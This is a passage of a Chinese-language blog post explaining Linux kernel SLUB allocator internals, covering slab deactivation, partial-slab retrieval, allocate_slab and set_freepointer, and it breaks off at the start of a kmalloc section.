class="hljs-keyword">enum</span> <span class="hljs-title">slab_modes</span> &#123;</span> M_NONE, M_PARTIAL, M_FREE, M_FULL_NOLIST &#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_node</span> *<span class="hljs-title">n</span> =</span> get_node(s, slab_nid(slab));<br><span class="hljs-type">int</span> free_delta = <span class="hljs-number">0</span>;<br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">slab_modes</span> <span class="hljs-title">mode</span> =</span> M_NONE;<br><span class="hljs-type">void</span> *nextfree, *freelist_iter, *freelist_tail;<br><span class="hljs-type">int</span> tail = DEACTIVATE_TO_HEAD;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> flags = <span class="hljs-number">0</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> <span class="hljs-title">new</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> <span class="hljs-title">old</span>;</span><br><br><span class="hljs-keyword">if</span> (slab-&gt;freelist) &#123;<br>stat(s, DEACTIVATE_REMOTE_FREES);<br>tail = DEACTIVATE_TO_TAIL;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 阶段一: 统计 cpu&#x27;s freelist 上的对象数量（free_delta） </span><br><span class="hljs-comment"> * 并保存最后一个对象（freelist_tail） 用于后面的拼接.</span><br><span class="hljs-comment"> */</span><br>freelist_tail = <span class="hljs-literal">NULL</span>;<br>freelist_iter = freelist;<br><span class="hljs-keyword">while</span> (freelist_iter) &#123;<br>nextfree = get_freepointer(s, freelist_iter);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 若 &#x27;nextfree&#x27; 无效, 在 &#x27;freelist_iter&#x27; 上的对象可能已被破坏.</span><br><span class="hljs-comment"> * 故通过略过 &#x27;freelist_iter&#x27; 起的所有对象来进行隔离.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (freelist_corrupted(s, slab, &amp;freelist_iter, nextfree))<br><span class="hljs-keyword">break</span>;<br><br>freelist_tail = freelist_iter;<br>free_delta++;<br><br>freelist_iter = nextfree;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 阶段二: 解冻slab并将per-cpu freelist拼接到slab&#x27;s freelist头部.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 确保链表的存在反映了在解冻期间实际的对象数量时，slab 已被解冻.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 我们首先在持有锁的情况下进行compxchg并当其成功时将 slab 插入链表.</span><br><span class="hljs-comment"> * 若有不匹配的情况则 slab 为未冻结且 slab 上的数量可能发生了改变.</span><br><span class="hljs-comment"> * 释放锁并再次重试 cmpxchg.</span><br><span class="hljs-comment"> */</span><br>redo:<br><br>old.freelist = READ_ONCE(slab-&gt;freelist);<br>old.counters = READ_ONCE(slab-&gt;counters);<br>VM_BUG_ON(!old.frozen);<br><br><span class="hljs-comment">/* 确定 slab 的目标状态 */</span><br>new.counters = old.counters;<br><span class="hljs-keyword">if</span> (freelist_tail) &#123;<br>new.inuse -= free_delta;<br>set_freepointer(s, freelist_tail, old.freelist);<br>new.freelist = freelist;<br>&#125; <span class="hljs-keyword">else</span><br>new.freelist = old.freelist;<br><br>new.frozen = <span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">if</span> (!new.inuse &amp;&amp; n-&gt;nr_partial &gt;= s-&gt;min_partial) &#123;<br>mode = M_FREE;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (new.freelist) &#123;<br>mode = M_PARTIAL;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 持有自旋锁消除了acquire_slab()看到一个slab为冻结的可能性</span><br><span class="hljs-comment"> */</span><br>spin_lock_irqsave(&amp;n-&gt;list_lock, flags);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>mode = M_FULL_NOLIST;<br>&#125;<br><br><br><span class="hljs-keyword">if</span> (!cmpxchg_double_slab(s, slab,<br>old.freelist, old.counters,<br>new.freelist, new.counters,<br><span class="hljs-string">&quot;unfreezing slab&quot;</span>)) &#123;<br><span class="hljs-keyword">if</span> (mode == M_PARTIAL)<br>spin_unlock_irqrestore(&amp;n-&gt;list_lock, flags);<br><span class="hljs-keyword">goto</span> redo;<br>&#125;<br><br><br><span class="hljs-keyword">if</span> (mode == M_PARTIAL) &#123;<br>add_partial(n, slab, tail);<br>spin_unlock_irqrestore(&amp;n-&gt;list_lock, flags);<br>stat(s, tail);<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (mode == M_FREE) &#123;<br>stat(s, DEACTIVATE_EMPTY);<br>discard_slab(s, slab);<br>stat(s, FREE_SLAB);<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (mode == M_FULL_NOLIST) &#123;<br>stat(s, DEACTIVATE_FULL);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="④-new-slab：获取-percpu-partial-slab"><a href="#④-new-slab：获取-percpu-partial-slab" class="headerlink" title="④ new_slab：获取 percpu partial slab"></a>④ new_slab：获取 percpu partial slab</h4><p>接下来是 <code>new_slab</code> 标签，主要就是检查若有 percpu partial slab 则从 percpu partial 链表上获取一个 slab 将其设为 percpu slab 后 再跳转回 <code>redo</code> 标签：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c">new_slab:<br><br><span class="hljs-keyword">if</span> (slub_percpu_partial(c)) &#123;<span class="hljs-comment">//有 percpu partial slab</span><br>local_lock_irqsave(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br><span class="hljs-keyword">if</span> (unlikely(c-&gt;slab)) &#123;<span class="hljs-comment">//percpu slab 不为空，直接跳回 redo</span><br>local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br><span class="hljs-keyword">goto</span> reread_slab;<br>&#125;<br><span class="hljs-keyword">if</span> (unlikely(!slub_percpu_partial(c))) &#123;<span class="hljs-comment">//被抢占然后partial空了</span><br>local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br><span class="hljs-comment">/* 我们被抢占了且 partial 链表空了 */</span><br><span class="hljs-keyword">goto</span> new_objects;<br>&#125;<br><br><span class="hljs-comment">// 获取一张 percpu patial slab，跳回 redo</span><br>slab = c-&gt;slab = slub_percpu_partial(c);<br>slub_set_percpu_partial(c, slab);<br>local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br>stat(s, CPU_PARTIAL_ALLOC);<br><span class="hljs-keyword">goto</span> redo;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="⑤-new-objects：获取-node-pertial-slab-或向-buddy-请求新-slab-进行分配"><a href="#⑤-new-objects：获取-node-pertial-slab-或向-buddy-请求新-slab-进行分配" class="headerlink" title="⑤ new_objects：获取 node pertial slab 或向 buddy 请求新 slab 进行分配"></a>⑤ new_objects：获取 node pertial slab 或向 buddy 请求新 slab 进行分配</h4><p>若 percpu partial 链表也为空，那么便来到接下来的 <code>new_objects</code> 标签分配一个新的 slab，首先会设置 <code>partial_context</code>，调用 <code>get_partial()</code> 尝试从 <code>kmem_cache_node</code> 的 partial 链表分配一个 slab，若分配成功则直接跳转到 <code>check_new_slab</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">new_objects:<br><br>pc.flags = gfpflags;<br>pc.slab = &amp;slab;<br>pc.orig_size = orig_size;<br>freelist = get_partial(s, node, &amp;pc);<br><span class="hljs-keyword">if</span> (freelist)<br><span class="hljs-keyword">goto</span> check_new_slab;<br><br></code></pre></td></tr></table></figure><p><code>get_partial()</code> 首先会调用 <code>get_partial_node()</code> 从当前 node 的 <code>kmem_cache_node</code> 的 partial 链表分配 slab，若成功了则直接返回，如果失败了但是指定了分配的 node 为 <code>NUMA_NO_NODE</code>，则调用 <code>get_any_partial()</code> 从其他的 <code>kmem_cache_node</code> 的 partial 链表尝试分配：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 获取一个 partial slab, 加锁并返回.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<span class="hljs-title function_">get_partial</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-type">int</span> node, <span class="hljs-keyword">struct</span> partial_context *pc)</span><br>&#123;<br><span class="hljs-type">void</span> *object;<br><span class="hljs-type">int</span> searchnode = node;<br><br><span class="hljs-keyword">if</span> (node == NUMA_NO_NODE)<br>searchnode = numa_mem_id();<br><br><span class="hljs-comment">// 从当前 node 的 partial 链表分配 slab</span><br>object = get_partial_node(s, get_node(s, searchnode), pc);<br><span class="hljs-keyword">if</span> (object || node != NUMA_NO_NODE)<br><span class="hljs-keyword">return</span> object;<br><br><span class="hljs-comment">// 从其他 node 的 partial 链表分配 slab</span><br><span class="hljs-keyword">return</span> get_any_partial(s, pc);<br>&#125;<br></code></pre></td></tr></table></figure><p>若 <code>get_partial()</code> 没法获取到 slab，则调用 <code>new_slab()</code> 向 buddy system 请求一份新的 slab，若失败了则直接返回：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">slub_put_cpu_ptr(s-&gt;cpu_slab);<br>slab = new_slab(s, gfpflags, node);<br>c = slub_get_cpu_ptr(s-&gt;cpu_slab);<br><br><span class="hljs-keyword">if</span> (unlikely(!slab)) &#123;<br>slab_out_of_memory(s, gfpflags, node);<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br>stat(s, ALLOC_SLAB);<br></code></pre></td></tr></table></figure><p><code>new_slab()</code> 最后会调用到 <code>allocate_slab()</code>：</p><ul><li>首先检查页面分配标志位，之后调用 <code>alloc_slab_page()</code> 在指定 node 上进行分配<ul><li>若 <code>node == NUMA_NO_NODE</code>，则该函数会调用 <code>alloc_pages()</code>，否则会调用 <code>__alloc_pages_node()</code></li></ul></li><li>若失败了则再次调用  <code>alloc_slab_page()</code>  尝试进行最小内存分配（<code>kmem_cache-&gt;min</code>），仍失败则直接返回 NULL</li><li>初始化 slab 各成员，并调用 <code>shuffle_freelist()</code> 为空闲对象构造随机化链表，若未开启随机化则将空闲对象按顺序连接</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> slab *<span class="hljs-title function_">allocate_slab</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-type">gfp_t</span> flags, <span class="hljs-type">int</span> node)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> *<span class="hljs-title">slab</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_order_objects</span> <span class="hljs-title">oo</span> =</span> s-&gt;oo;<br><span class="hljs-type">gfp_t</span> alloc_gfp;<br><span class="hljs-type">void</span> *start, *p, *next;<br><span class="hljs-type">int</span> idx;<br><span class="hljs-type">bool</span> shuffle;<br><br>flags &amp;= gfp_allowed_mask;<br><br>flags |= s-&gt;allocflags;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 让最初的 higher-order 分配在内存压力下失败</span><br><span class="hljs-comment"> * 由此我们返回到最小 order 的分配.</span><br><span class="hljs-comment"> */</span><br>alloc_gfp = (flags | __GFP_NOWARN | __GFP_NORETRY) &amp; ~__GFP_NOFAIL;<br><span class="hljs-keyword">if</span> ((alloc_gfp &amp; __GFP_DIRECT_RECLAIM) &amp;&amp; oo_order(oo) &gt; oo_order(s-&gt;min))<br>alloc_gfp = (alloc_gfp | __GFP_NOMEMALLOC) &amp; ~__GFP_RECLAIM;<br><br>slab = alloc_slab_page(alloc_gfp, node, oo);<br><span class="hljs-keyword">if</span> (unlikely(!slab)) &#123;<span class="hljs-comment">//分配失败，尝试最小内存分配</span><br>oo = s-&gt;min;<br>alloc_gfp = flags;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 分配可能因为碎片化而失败.</span><br><span class="hljs-comment"> * 可能的话尝试一个 lower order 的分配</span><br><span class="hljs-comment"> */</span><br>slab = alloc_slab_page(alloc_gfp, node, oo);<br><span class="hljs-keyword">if</span> (unlikely(!slab))<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>stat(s, ORDER_FALLBACK);<br>&#125;<br><br>slab-&gt;objects = oo_objects(oo);<br>slab-&gt;inuse = <span class="hljs-number">0</span>;<br>slab-&gt;frozen = <span class="hljs-number">0</span>;<br><br>account_slab(slab, oo_order(oo), s, flags);<br><br>slab-&gt;slab_cache = s;<br><br>kasan_poison_slab(slab);<br><br>start = slab_address(slab);<br><br>setup_slab_debug(s, slab, start);<br><br><span class="hljs-comment">//开启了随机化会在该函数内随机连接</span><br>shuffle = shuffle_freelist(s, slab);<br><br><span class="hljs-comment">//未开启随机化，按顺序连接</span><br><span class="hljs-keyword">if</span> (!shuffle) &#123;<br>start = fixup_red_left(s, start);<br>start = setup_object(s, start);<br>slab-&gt;freelist = start;<br><span class="hljs-keyword">for</span> (idx = <span class="hljs-number">0</span>, p = start; idx &lt; slab-&gt;objects - <span class="hljs-number">1</span>; idx++) &#123;<br>next = p + s-&gt;size;<br>next = setup_object(s, next);<br>set_freepointer(s, p, next);<br>p = next;<br>&#125;<br>set_freepointer(s, p, <span class="hljs-literal">NULL</span>);<br>&#125;<br><br><span class="hljs-keyword">return</span> slab;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里用了一个函数 <code>set_freepointer()</code>，主要就是用 <code>freelist_ptr()</code> 向 <code>object + s-&gt;offset</code> 的位置写入用 <code>freelist_ptr()</code> 加密后的 <code>fp</code> 指针：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title function_">set_freepointer</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-type">void</span> *object, <span class="hljs-type">void</span> *fp)</span><br>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> freeptr_addr = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)object + s-&gt;offset;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span><br>BUG_ON(object == fp); <span class="hljs-comment">/* naive detection of double free or corruption */</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>freeptr_addr = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)kasan_reset_tag((<span class="hljs-type">void</span> *)freeptr_addr);<br>*(<span class="hljs-type">void</span> **)freeptr_addr = freelist_ptr(s, fp, freeptr_addr);<br>&#125;<br></code></pre></td></tr></table></figure><p>返回 <code>___slab_alloc()</code>，如果<strong>该 kmem_cache 设置了 <code>SLAB_DEBUG_FLAGS</code> 标志位</strong>，则接下来会调用 <code>alloc_single_from_new_slab()</code> <strong>从新获取到的 slab 上分配一个对象后将 slab 重新挂回 partial&#x2F;full 链表</strong>，若分配失败则跳转回 <code>new_objects</code>，成功则直接返回</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (kmem_cache_debug(s)) &#123;<br>freelist = alloc_single_from_new_slab(s, slab, orig_size);<br><br><span class="hljs-keyword">if</span> (unlikely(!freelist))<br><span class="hljs-keyword">goto</span> new_objects;<br><br><span class="hljs-keyword">if</span> (s-&gt;flags &amp; SLAB_STORE_USER)<br>set_track(s, freelist, TRACK_ALLOC, addr);<br><br><span class="hljs-keyword">return</span> freelist;<br>&#125;<br></code></pre></td></tr></table></figure><p>如果没有设置 <code>SLAB_DEBUG_FLAGS</code> 标志位，则接下来获取 slab 的 freelist，并调用 <code>inc_slabs_node()</code> 增加 node 上的计数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * No other reference to the slab yet so we can</span><br><span class="hljs-comment"> * muck around with it freely without cmpxchg</span><br><span class="hljs-comment"> */</span><br>freelist = slab-&gt;freelist;<br>slab-&gt;freelist = <span class="hljs-literal">NULL</span>;<br>slab-&gt;inuse = slab-&gt;objects;<br>slab-&gt;frozen = <span class="hljs-number">1</span>;<br><br>inc_slabs_node(s, slab_nid(slab), slab-&gt;objects);<br></code></pre></td></tr></table></figure><h4 id="⑥-check-new-slab：检查-slab"><a href="#⑥-check-new-slab：检查-slab" class="headerlink" title="⑥ check_new_slab：检查 slab"></a>⑥ check_new_slab：检查 slab</h4><p>接下来对新获取的 slab 进行检查，若该 kmem_cache 设置了 <code>SLAB_DEBUG_FLAGS</code> 标志位，检查是否设置了 <code>SLAB_STORE_USER</code> 标志位，之后直接返回 freelist</p><p>接下来调用 <code>pfmemalloc_match()</code> 检查 slab 与分配标志位是否不匹配，若是则调用 <code>deactivate_slab()</code> 使其不再活动并返回 freelist</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c">check_new_slab:<br><br><span class="hljs-keyword">if</span> (kmem_cache_debug(s)) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * For debug caches here we had to go through</span><br><span class="hljs-comment"> * alloc_single_from_partial() so just store the tracking info</span><br><span class="hljs-comment"> * and return the object</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (s-&gt;flags &amp; SLAB_STORE_USER)<br>set_track(s, freelist, TRACK_ALLOC, addr);<br><br><span class="hljs-keyword">return</span> freelist;<br>&#125;<br><br><span class="hljs-keyword">if</span> (unlikely(!pfmemalloc_match(slab, gfpflags))) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * For !pfmemalloc_match() case we don&#x27;t load freelist so that</span><br><span class="hljs-comment"> * we don&#x27;t make further mismatched allocations easier.</span><br><span class="hljs-comment"> */</span><br>deactivate_slab(s, slab, get_freepointer(s, freelist));<br><span class="hljs-keyword">return</span> freelist;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="⑦-retry-load-slab："><a href="#⑦-retry-load-slab：" class="headerlink" title="⑦ retry_load_slab："></a>⑦ retry_load_slab：</h4><p>最后就是尝试加载新获得的 slab，如果 percpu slab 不为 NULL 则使其不再活动，并设置 percpu slab &amp; freelist 为 NULL，并获取下一个 tid</p><p>最后就是将 percpu slab 设为新获取的 slab 并跳转回 <code>load_freelist</code> 分配对象并返回</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c">retry_load_slab:<br><br>local_lock_irqsave(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br><span class="hljs-keyword">if</span> (unlikely(c-&gt;slab)) &#123;<br><span class="hljs-type">void</span> *flush_freelist = c-&gt;freelist;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> *<span class="hljs-title">flush_slab</span> =</span> c-&gt;slab;<br><br>c-&gt;slab = <span class="hljs-literal">NULL</span>;<br>c-&gt;freelist = <span class="hljs-literal">NULL</span>;<br>c-&gt;tid = next_tid(c-&gt;tid);<br><br>local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br><br>deactivate_slab(s, flush_slab, flush_freelist);<br><br>stat(s, CPUSLAB_FLUSH);<br><br><span class="hljs-keyword">goto</span> retry_load_slab;<br>&#125;<br>c-&gt;slab = slab;<br><br><span class="hljs-keyword">goto</span> load_freelist;<br>&#125;<br></code></pre></td></tr></table></figure><p>至此， slub 分配算法的核心逻辑分析结束</p><h2 id="二、kmalloc：-NUMA-NO-NODE-的通用上层分配接口"><a href="#二、kmalloc：-NUMA-NO-NODE-的通用上层分配接口" class="headerlink" title="二、kmalloc： NUMA_NO_NODE 的通用上层分配接口"></a>二、kmalloc： NUMA_NO_NODE 的通用上层分配接口</h2><p>我们日常生活中（？）最常用的其实还是 <code>kmalloc()</code>，其会根据分配的大小与标志位帮我们完成 <code>kmem_cache</code> 的选取并进行对象分配</p><p>函数整体逻辑比较简单：</p><ul><li>若分配的大小在编译期已知（<code>__builtin_constant_p()</code>）则判断大小：<ul><li>若大小大于 <code>KMALLOC_MAX_CACHE_SIZE</code> 则使用 <code>kmalloc_large()</code> 进行分配</li><li>通过 <code>kmalloc_index()</code> 与 <code>kmalloc_type()</code> 获取 <code>kmalloc_caches</code> 中对应的数组下标并调用 <code>kmalloc_trace</code> 进行对象分配</li></ul></li><li>若大小是动态传入的，调用 <code>__kmalloc()</code> 进行分配</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * kmalloc - 分配内核内存</span><br><span class="hljs-comment"> * @size: 需要的内存字节数.</span><br><span class="hljs-comment"> * @flags: 描述分配上下文</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * kmalloc 是内核中分配小于页面大小的内存对象的通用方法.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 被分配的对象地址至少要对齐到 ARCH_KMALLOC_MINALIGN 字节.</span><br><span class="hljs-comment"> * 对于 2^n 字节的 @size , 对齐也需要保证至少到该大小.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * @flags argument 可能是 include/linux/gfp.h 中定义的GFP 标志位，描述于</span><br><span class="hljs-comment"> * :ref:`Documentation/core-api/mm-api.rst &lt;mm-api-gfp-flags&gt;`</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 推荐的对 @flags 使用描述于</span><br><span class="hljs-comment"> * :ref:`Documentation/core-api/memory-allocation.rst &lt;memory_allocation&gt;`</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 以下为最常用的 GFP 标志位简要概述</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * %GFP_KERNEL</span><br><span class="hljs-comment"> *分配普通内核内存. 可能睡眠.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * %GFP_NOWAIT</span><br><span class="hljs-comment"> *分配将不会睡眠.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * %GFP_ATOMIC</span><br><span class="hljs-comment"> *分配将不会睡眠.  可能使用 emergency pools.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 也可以通过异或以下的一个或多个额外@flags来设置不同的标志位:</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * %__GFP_ZERO</span><br><span class="hljs-comment"> *在返回前清零分配的内存. 也可参见 kzalloc().</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * %__GFP_HIGH</span><br><span class="hljs-comment"> *这个分配有着高优先级且可能使用 emergency pools.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * %__GFP_NOFAIL</span><br><span class="hljs-comment"> *表示此次分配不允许失败</span><br><span class="hljs-comment"> *(在使用前再次思考).</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * %__GFP_NORETRY</span><br><span class="hljs-comment"> *若内存不会马上可用,立即放弃.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * %__GFP_NOWARN</span><br><span class="hljs-comment"> *若分配失败，不要提交警告.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * %__GFP_RETRY_MAYFAIL</span><br><span class="hljs-comment"> *努力尝试使分配成功，但最终失败.</span><br><span class="hljs-comment"> */</span><br><span 